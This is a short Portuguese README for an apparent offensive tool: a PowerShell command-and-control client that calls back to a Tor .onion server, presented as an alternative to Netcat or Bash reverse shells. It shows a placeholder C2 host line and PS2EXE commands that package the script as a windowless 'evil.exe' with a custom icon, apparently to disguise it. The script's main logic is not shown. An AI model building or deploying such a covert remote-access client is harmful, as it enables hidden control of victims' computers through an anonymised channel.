# client-C2-Tor-Powershell
Ao invés de usar ferramentas tradicionais como Netcat ou Bash reverse shells, que geralmente são comuns em ambientes Linux, usamos PowerShell — que, por padrão, não possui uma forma nativa de se comunicar com serviços SOCKS5 (como os oferecidos pelo Tor). Por isso, é necessário criar a conexão manualmente via sockets.

## script.ps1

$onionHost = "seuc2.onion"  # <-- substitua aqui


E depois, convertendo o script .ps1 para um executável .exe com ícone personalizado, usamos o módulo PS2EXE, que está disponível no GitHub: **Repositório GitHub: https://github.com/MScholtes/PS2EXE**

```ps
Import-Module ".\ps2exe\PS2EXE-master\Module\ps2exe.psm1"
```

## PS2EXE coverter .ps1 para .exe

```ps
Invoke-ps2exe -inputFile "C:\Users\***USERNAME_OS***\Downloads\script.ps1" -outputFile "C:\Users\***USERNAME_OS***\Downloads\evil.exe" -noConsole -iconFile "C:\Users\***USERNAME_OS***\Downloads\evil.ico"
```

### Créditos: **https://netcattest.com/aula/128**

<br/>

### Aula: **https://www.youtube.com/watch?v=ZI0nxthptvY**
